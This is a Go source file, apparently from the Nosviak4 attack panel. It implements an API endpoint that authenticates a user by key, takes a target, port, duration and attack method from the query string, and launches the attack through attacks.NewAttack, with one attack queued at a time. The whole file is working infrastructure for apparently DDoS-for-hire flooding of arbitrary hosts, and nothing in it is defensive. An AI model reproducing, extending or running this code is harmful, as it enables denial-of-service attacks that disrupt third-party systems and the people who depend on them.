package api

import (
	"Nosviak4/source"
	"Nosviak4/source/database"
	"Nosviak4/source/functions"
	"Nosviak4/source/masters/attacks"
	"Nosviak4/source/masters/commands"
	"Nosviak4/source/masters/sessions"
	"fmt"
	"net"
	"sync"
	"time"

	"net/http"
	"strconv"
	"strings"

	"github.com/gorilla/mux"
	"github.com/nicklaw5/go-respond"
)

// we make it so attacks can only be sent 1 by 1 and are entered into a queue
var mutex sync.Mutex

// LaunchAPIAttack will launch the api attack towards the target specified.
func LaunchAPIAttack(writer http.ResponseWriter, request *http.Request) {
	mutex.Lock()
	defer mutex.Unlock()	

	responder, pickup := respond.NewResponse(writer), time.Now()
	user, err := database.DB.GetUserAPIKey(mux.Vars(request)["key"])
	if err != nil || !user.API {
		responder.Unauthorized(&MiddlewareReject{Status: false, Message: "Unauthorized"})
		return
	}

	/* includes the parameters required. */
	if !request.URL.Query().Has("target") || !request.URL.Query().Has("port") || !request.URL.Query().Has("duration") || !request.URL.Query().Has("method") {
		responder.BadRequest(&MiddlewareReject{Status: false, Message: "Missing Parameters"})
		return
	}

	/* tries to find the method */
	method, ok := source.Methods[strings.ToLower(request.URL.Query().Get("method"))]
	if !ok || method == nil {
		responder.BadRequest(&MiddlewareReject{Status: false, Message: "Bad Method"})
		return
	}

	if !method.Options.API {
		responder.BadRequest(&MiddlewareReject{Status: false, Message: "Method not available on the API"})
		return
	}

	duration, err := strconv.Atoi(request.URL.Query().Get("duration"))
	if err != nil || duration == 0 {
		responder.BadRequest(&MiddlewareReject{Status: false, Message: "Bad Duration"})
		return
	}

	port, err := strconv.Atoi(request.URL.Query().Get("port"))
	if err != nil || port <= 0 {
		responder.BadRequest(&MiddlewareReject{Status: false, Message: "Bad Port"})
		return
	}

	args := make([]string, 0)
	for key, value := range request.URL.Query() {
		kv, ok := method.Options.KeyValues[key]
		if !ok || kv == nil || len(value) == 0 {
			continue
		}

		args = append(args, fmt.Sprintf(source.MethodConfig.Attacks.KvPrefix + "%s=%s", key, value[0]))
	}

	kvs, err := functions.HandleKeyValues(args, method)
	if err != nil {
		responder.BadRequest(&MiddlewareReject{Status: false, Message: err.Error()})
		return
	}

	/* NewAttack will launch the attack towards the endpoint directly. */
	if err := attacks.NewAttack(&sessions.Session{User: user}, method, request.URL.Query().Get("method"), request.URL.Query().Get("target"), duration, port, make(map[string]interface{}), commands.Conn.SendWebhook); err != nil {
		if _, ok := err.(net.Error); ok {
			responder.InternalServerError(&MiddlewareReject{Status: false, Message: "Internal Server Error"})
			return	
		}

		responder.InternalServerError(&MiddlewareReject{Status: false, Message: err.Error()})
		return
	}

	/* responds to the request with the information saying it's sent */
	responder.Ok(map[string]any{
		"status": true,

		/* fields */
		"port": port,
		"target": request.URL.Query().Get("target"),
		"duration": duration,

		/* method used */
		"method": request.URL.Query().Get("method"),

		/* responded is how long it took us to respond to the attack */
		"responded": time.Since(pickup),

		/* returns the key values for the request */
		"kvs": kvs,
	})
}